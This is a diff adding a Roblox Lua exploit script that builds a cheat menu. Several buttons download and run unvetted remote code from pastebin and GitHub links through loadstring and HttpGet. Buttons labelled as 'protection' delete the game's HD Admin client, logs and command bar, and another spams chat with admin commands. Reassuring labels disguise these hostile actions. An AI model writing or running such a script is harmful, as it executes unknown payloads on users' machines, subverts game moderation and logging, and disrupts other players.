@@ -1,0 +1,151 @@
+--[[
+	✨ Cleaned, English & Generalized Edition
+]]
+
+local localPlayer = game.Players.LocalPlayer
+
+-- [ 1. Interface Initialization ]
+local coreGuiContainer = Instance.new("ScreenGui", game:GetService("CoreGui"))
+coreGuiContainer.Name = "BaseModule_Interface"
+
+-- Rainbow Welcome Notification
+local function ShowWelcome()
+    local welcomeLabel = Instance.new("TextLabel", coreGuiContainer)
+    welcomeLabel.Size = UDim2.new(0, 500, 0, 100)
+    welcomeLabel.Position = UDim2.new(0.5, -250, 0.4, 0)
+    welcomeLabel.BackgroundTransparency = 1
+    welcomeLabel.Text = "System Loaded Successfully"
+    welcomeLabel.Font = Enum.Font.GothamBlack
+    welcomeLabel.TextSize = 40
+    task.spawn(function()
+        local start = tick()
+        while tick() - start < 5 do
+            welcomeLabel.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+            task.wait()
+        end
+        welcomeLabel:Destroy()
+    end)
+end
+task.spawn(ShowWelcome)
+
+-- [ 2. Main GUI Frame ]
+local BaseFrame = Instance.new("Frame", coreGuiContainer)
+local FrameCorner = Instance.new("UICorner", BaseFrame)
+local FrameStroke = Instance.new("UIStroke", BaseFrame)
+BaseFrame.Size = UDim2.new(0, 450, 0, 450)
+BaseFrame.Position = UDim2.new(0.5, -225, 0.5, -225)
+BaseFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+BaseFrame.BackgroundTransparency = 0.2
+BaseFrame.Visible = false
+FrameStroke.Thickness = 3
+FrameStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+-- [ 3. Main Toggle Button - Draggable ]
+local ControlBtn = Instance.new("TextButton", coreGuiContainer)
+local BtnCorner = Instance.new("UICorner", ControlBtn)
+local BtnStroke = Instance.new("UIStroke", ControlBtn)
+ControlBtn.Size = UDim2.new(0, 110, 0, 50) 
+ControlBtn.Position = UDim2.new(0, 15, 0.5, 0)
+ControlBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ControlBtn.Text = "MENU"
+ControlBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
+ControlBtn.Font = Enum.Font.GothamBold
+ControlBtn.TextSize = 25 
+ControlBtn.Visible = true 
+ControlBtn.Draggable = true
+BtnStroke.Thickness = 2
+
+-- Rainbow Border Effect
+task.spawn(function()
+    while true do
+        local color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+        FrameStroke.Color = color
+        BtnStroke.Color = color
+        task.wait()
+    end
+end)
+
+ControlBtn.MouseButton1Click:Connect(function()
+    BaseFrame.Visible = not BaseFrame.Visible
+end)
+
+-- [ 4. Menu Layout & Content ]
+local TitleLabel = Instance.new("TextLabel", BaseFrame)
+TitleLabel.Size = UDim2.new(1, 0, 0, 50)
+TitleLabel.Text = "Main Control Panel ⚙️"
+TitleLabel.TextColor3 = Color3.new(1, 1, 1)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextSize = 22
+
+local ScrollContainer = Instance.new("ScrollingFrame", BaseFrame)
+ScrollContainer.Size = UDim2.new(1, -20, 1, -110)
+ScrollContainer.Position = UDim2.new(0, 10, 0, 60)
+ScrollContainer.BackgroundTransparency = 1
+ScrollContainer.CanvasSize = UDim2.new(0, 0, 4, 0)
+ScrollContainer.ScrollBarThickness = 4
+local ListLayout = Instance.new("UIListLayout", ScrollContainer)
+ListLayout.Padding = UDim.new(0, 8)
+
+local function AddMenuButton(buttonName, actionCallback)
+    local button = Instance.new("TextButton", ScrollContainer)
+    button.Size = UDim2.new(1, -10, 0, 40)
+    button.BackgroundColor3 = Color3.fromRGB(45, 0, 0)
+    button.Text = buttonName
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.Font = Enum.Font.GothamBold
+    button.TextSize = 16
+    Instance.new("UICorner", button)
+    button.MouseButton1Click:Connect(actionCallback)
+end
+
+-- [ 5. Feature Buttons Registration ]
+
+AddMenuButton("L3 on top 🌑", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/CeVJD20Y"))()
+end)
+
+AddMenuButton("Protect HD Client (Workspace) 🛡️", function()
+    local cleanCount = 0
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj.Name == "HDAdminHDClient" then
+            obj:Destroy()
+            cleanCount = cleanCount + 1
+        end
+    end
+    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Security System", Text = "Cleaned " .. cleanCount .. " files", Duration = 5})
+end)
+
+AddMenuButton("Full Protection 🛡️ (Global Clean)", function()
+    local cleanCount = 0
+    local targets = {"logs", "nv", "cmdbar", "clogs", "hdadminhdclient", "hdadmin"}
+    local function ExecutionClean(parent)
+        for _, obj in pairs(parent:GetChildren()) do
+            local found = false
+            for _, name in pairs(targets) do if obj.Name:lower():find(name) then found = true break end end
+            if found then obj:Destroy() cleanCount = cleanCount + 1 else pcall(function() ExecutionClean(obj) end) end
+        end
+    end
+    ExecutionClean(workspace) ExecutionClean(localPlayer.PlayerGui)
+end)
+
+AddMenuButton("Spam v3 Developer 🔥", function()
+    local messageString = "logs ;re ;clogs "
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(string.rep(messageString, 15), "All")
+end)
+
+AddMenuButton("VR7 Tool Help", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP"))() end)
+AddMenuButton("Player Finder", function() loadstring(game:HttpGet('https://pastebin.com/raw/1KF6k8ne'))() end)
+AddMenuButton("Blood Script", function() loadstring(game:HttpGet('https://pastebin.com/raw/YE8hR6zG'))() end)
+
+-- Info Button
+local InfoBtn = Instance.new("TextButton", BaseFrame)
+InfoBtn.Size = UDim2.new(0, 150, 0, 40)
+InfoBtn.Position = UDim2.new(0.5, -75, 1, -50)
+InfoBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+InfoBtn.Text = "System Info 👤"
+InfoBtn.TextColor3 = Color3.new(1, 1, 1)
+Instance.new("UICorner", InfoBtn)
+InfoBtn.MouseButton1Click:Connect(function()
+    print("System active and running successfully.")
+end)
